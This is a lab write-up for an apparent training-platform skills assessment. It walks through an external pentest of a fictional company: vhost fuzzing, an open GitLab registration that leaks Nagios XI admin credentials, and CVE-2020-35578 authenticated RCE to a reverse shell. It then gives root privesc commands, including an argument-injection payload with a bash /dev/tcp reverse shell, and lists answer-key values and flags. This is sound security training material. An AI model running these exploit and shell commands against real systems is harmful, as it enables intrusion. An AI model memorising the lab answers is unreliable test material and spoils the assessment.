# Section 32 — Skills Assessment II

**Scenario:** External pentest of Inlanefreight. One unremarkable host; a note about the `gitlab.inlanefreight.local` vhost. Deep, iterative enumeration reveals a chain: WordPress + GitLab + Nagios XI.

## ✅ Answers (all verified live)

| Q | Answer |
|---|--------|
| Q1 — WordPress URL | `http://blog.inlanefreight.local` |
| Q2 — public GitLab project | `Nagios-Postgresql` (creds-bearing; `Virtualhost` is the only *unauth*-public one) |
| Q3 — third vhost FQDN | `monitoring.inlanefreight.local` |
| Q4 — app on third vhost (1 word) | `Nagios` |
| Q5 — admin password | `oilaKglm7M09@CPL&^lC` |
| Q6 — flag.txt | `afe377683dce373ec2bf7eaf1e0107eb` |

**Full chain:** vhost enum → identify blog(WordPress)/gitlab/monitoring(Nagios XI) → GitLab `Virtualhost` README leaks `monitoring` vhost → GitLab **open registration** → internal project `root/nagios-postgresql` `INSTALL` leaks `nagiosadmin` creds → Nagios XI 5.7.5 login → **CVE-2020-35578** auth RCE → reverse shell as `www-data` → flag.

---

## 0 — Setup (edit these for any future target)

```bash
# --- variables: change per engagement ---
export TARGET=10.129.201.90                                   # box IP (HTB panel)
export LHOST=$(ip -br a show tun0 | awk '{print $3}' | cut -d/ -f1)   # your VPN IP
echo "TARGET=$TARGET  LHOST=$LHOST"

# --- vhost resolution (tools like wpscan/ffuf/exploit scripts need real DNS) ---
echo "$TARGET inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local monitoring.inlanefreight.local" | sudo tee -a /etc/hosts
```
> No `/etc/hosts` entry = every hostname-based tool dies with "Name or service not known". Add **all** discovered vhosts up front. (I had to monkeypatch DNS in Python earlier purely because I lacked sudo for `/etc/hosts` — with sudo, just do this.)

---

## 1 — Port & service enumeration

```bash
# -sT = unprivileged TCP connect scan (no sudo needed for nmap itself)
nmap -p- -sT -sV -T4 --min-rate 2000 -Pn --open $TARGET -oN nmap_skills2.txt
```
> `-p-` all 65535 ports (apps hide on odd ports), `-sV` versions, `--min-rate 2000` speeds the full sweep, `-Pn` skips ping (HTB blocks ICMP). Result here: 22/SSH, 25/SMTP, 80+443/Apache, **5667/NSCA (Nagios!)**, 8060/nginx, **8180/nginx (GitLab)**, 9094.

> `5667` = NSCA (Nagios Service Check Acceptor) — an immediate "there is a Nagios here" tell before you even browse.

---

## 2 — vhost discovery

```bash
# baseline size of a junk vhost so we can filter the wildcard/default site
curl -s -o /dev/null -w "baseline=%{size_download}\n" -H "Host: zzz.inlanefreight.local" "http://$TARGET/"

# fuzz vhosts, filter out the default-site size from the line above
ffuf -s -u "http://$TARGET/" -H "Host: FUZZ.inlanefreight.local" \
  -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fs <baseline> -t 40
```
> The default Apache vhost answers `200` for *any* Host header, so a naive fuzz returns everything. Grab the default response size first, then `-fs <size>` filters it out. Survivors here: **gitlab**, **monitoring**, **blog**.

```bash
# identify each vhost
for h in inlanefreight.local blog.inlanefreight.local gitlab.inlanefreight.local monitoring.inlanefreight.local; do
  echo "== $h =="
  curl -s -m 15 -i -H "Host: $h" "http://$TARGET/" | grep -iE "^HTTP|Location:|<title>|generator"
done
```
> - `blog.` → 200, WordPress ("Inlanefreight Employee Blog") → **Q1 = http://blog.inlanefreight.local**
> - `gitlab.` → 301 to `:8180` → GitLab
> - `monitoring.` → 302 to `/nagiosxi/login.php` → **Nagios XI** → **Q3/Q4 = monitoring.inlanefreight.local / Nagios**

---

## 3 — GitLab: public project + the README hint

```bash
GL="http://$TARGET:8180"; H="Host: gitlab.inlanefreight.local"

# list publicly visible projects (no auth)
curl -s -H "$H" "$GL/api/v4/projects?per_page=50" | python3 -m json.tool | grep -E '"path_with_namespace"|"visibility"'

# the only public one: root/virtualhost  -> read its README
curl -s -H "$H" "$GL/api/v4/projects/root%2Fvirtualhost/repository/files/README.md/raw?ref=master"
```
> Only `root/virtualhost` is public (**Q2's *unauth* answer = Virtualhost**). Its README example literally says `sudo virtualhost create monitoring.inlanefreight.local` — confirming the third vhost. The *credential-bearing* project (`nagios-postgresql`) is **internal** (needs any logged-in account) — that's the project the question is really after → **Q2 = Nagios-Postgresql**.

---

## 4 — GitLab open registration → internal project creds

GitLab signup is open. Register, complete the forced "welcome" step, then read the internal project.

```bash
# quick check: registration enabled?
curl -s -o /dev/null -w "%{http_code}\n" -H "Host: gitlab.inlanefreight.local" "http://$TARGET:8180/users/sign_up"   # 200 = open
```
> Manual path in a browser is easiest: add the hosts entry, browse `http://gitlab.inlanefreight.local:8180/users/sign_up`, register, complete the **welcome/role** page (GitLab blocks API/repo access until that onboarding step is done), then open `http://gitlab.inlanefreight.local:8180/root/nagios-postgresql` → file `INSTALL`.

```bash
# scripted (urllib, handles the welcome PATCH + cookie jar) — see /tmp/gitlab_reg.py in this kit
# key line recovered from root/nagios-postgresql/INSTALL:
#   postgres=# CREATE USER nagiosadmin WITH PASSWORD 'oilaKglm7M09@CPL&^lC';
```
> **Q5 = `oilaKglm7M09@CPL&^lC`**. Lesson: GitLab "internal" visibility ≠ private — *any* account (open signup) sees it. Always test signup, then re-enumerate projects authenticated. The post-signup **welcome step is mandatory**: skipping it = every repo request 302s back to onboarding.

---

## 5 — Nagios XI: confirm version + login

```bash
# version is in the login page footer / dashboard
curl -s -H "Host: monitoring.inlanefreight.local" "http://$TARGET/nagiosxi/login.php" | grep -ioE "Nagios XI|5\.[0-9]\.[0-9]+" | sort -u
```
> Browse `http://monitoring.inlanefreight.local/nagiosxi/`, log in `nagiosadmin : oilaKglm7M09@CPL&^lC`. Dashboard shows **Nagios XI 5.7.5**. `5.7.5 < 5.8.0` → vulnerable to **CVE-2020-35578** (Plugins filename auth RCE).

---

## 6 — RCE: CVE-2020-35578 (exploit-db 49422)

> MSF is broken on this Kali (`uninitialized constant HTTP` for every HTTP module) — use the Python PoC.

```bash
searchsploit -m 49422                                  # -> ~/49422.py  (CVE-2020-35578)
sudo apt install -y python3-requests python3-bs4 python3-lxml   # Kali PEP-668: use apt, not pip

# terminal 2: listener
nc -lvnp 4444

# terminal 1: fire it  (url  user  pass  LHOST  LPORT)
python3 ~/49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' $LHOST 4444
```
> The exploit logs in, abuses the **monitoring-plugins upload**: the *filename* field is injected (`;<payload>;#`) and executed when Nagios runs `dos2unix` on it (`convert_to_unix=1`). Payload = a base64 reverse shell. Shell returns as **`www-data`** (member of groups `nagios`, `nagcmd`).
> Gotchas: `pip3 install` fails on Kali (`externally-managed-environment`) → `apt install python3-*` instead. The script connects by **hostname**, so the `/etc/hosts` entry from step 0 is mandatory.

---

## 7 — Flag (and privesc options)

The flag was directly readable as `www-data` — no privesc needed:

```bash
ls -la /usr/local/nagiosxi/html/admin/ | grep -i flag
cat /usr/local/nagiosxi/html/admin/*_flag.txt        # -> afe377683dce373ec2bf7eaf1e0107eb
```
> **Q6 = `afe377683dce373ec2bf7eaf1e0107eb`**. Always `find / -name '*flag*' 2>/dev/null` and check the app's own web dirs before privesc — the objective may not require root.

**Privesc to root (documented for real engagements — `sudo -l` as www-data):**
```
(root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
(root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
(root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
```
Option A — npcd binary swap (www-data is in the `nagios` group, can write `npcd`):
```bash
printf '#!/bin/bash\ncp /root/flag.txt /tmp/f.txt; chmod 777 /tmp/f.txt\n' > /usr/local/nagios/bin/npcd
chmod +x /usr/local/nagios/bin/npcd
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd     # runs npcd as root
cat /tmp/f.txt
```
Option B — `autodiscover_new.php` argument injection (runs as root):
```bash
sudo /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php "address=; bash -c 'bash -i >& /dev/tcp/$LHOST/4445 0>&1' ;"
```
> Either gives root. The npcd swap is the canonical Nagios XI privesc: `manage_services.sh` (sudo-allowed, wildcard) restarts a service whose binary you control because you're in its group.

---

## Exam / Engagement Notes

- **`/etc/hosts` first.** Hostname-based tooling (wpscan, the exploit scripts, GitLab redirects) breaks instantly without it. Add every vhost the moment you find it.
- **vhost fuzzing needs a size filter** — default Apache vhost returns 200 for any Host; baseline then `-fs`.
- **Service ports are fingerprints**: 5667/NSCA ⇒ Nagios; 8180 nginx ⇒ often GitLab; 8060 nginx ⇒ check vhosts.
- **GitLab "internal" ≠ private.** Test `/users/sign_up`; if open, register → complete the **mandatory welcome step** → re-enumerate `/api/v4/projects` and `/explore/projects` authenticated.
- **Map version → CVE before exploiting.** Nagios XI 5.7.5 < 5.8.0 → CVE-2020-35578 (exploit-db 49422); 5.5.6–5.7.5 → ConfigWizards (MSF #3) — pick by exact version.
- **Kali quirks to expect:** `pip3` blocked (`externally-managed`) → `apt install python3-<pkg>`; this box's `msfconsole` is broken for HTTP modules → use standalone PoCs.
- **Check for the loot before privesc** — `find / -name '*flag*'` and the app's web root; root may be unnecessary.
- Privesc reflex on Nagios XI: `sudo -l` → `manage_services.sh`/`npcd` swap or `autodiscover_new.php` injection → root.

---

## Lab Walkthrough (quick steps)

```
1. hosts: TARGET -> inlanefreight.local blog. gitlab. monitoring.
2. nmap -p- -sT -sV            -> 5667 NSCA, 8180 GitLab, 80 Apache vhosts
3. ffuf vhosts (-fs baseline)  -> blog / gitlab / monitoring
4. blog. = WordPress           -> Q1 http://blog.inlanefreight.local
5. gitlab /api/v4/projects     -> public 'Virtualhost'; README -> monitoring vhost
   register account + welcome  -> internal root/nagios-postgresql
   INSTALL file                -> Q5 nagiosadmin:oilaKglm7M09@CPL&^lC
6. monitoring = Nagios XI 5.7.5 -> Q3 monitoring.inlanefreight.local / Q4 Nagios
7. searchsploit -m 49422 ; nc -lvnp 4444
   python3 49422.py http://monitoring.inlanefreight.local nagiosadmin '<pw>' $LHOST 4444
8. www-data shell -> cat /usr/local/nagiosxi/html/admin/*_flag.txt
                                -> Q6 afe377683dce373ec2bf7eaf1e0107eb
   (privesc if needed: sudo manage_services.sh npcd-swap -> root)
```

> One line: vhost-enum → GitLab public README + open-registration internal project leak Nagios creds → Nagios XI 5.7.5 CVE-2020-35578 → www-data shell → flag in the web dir.
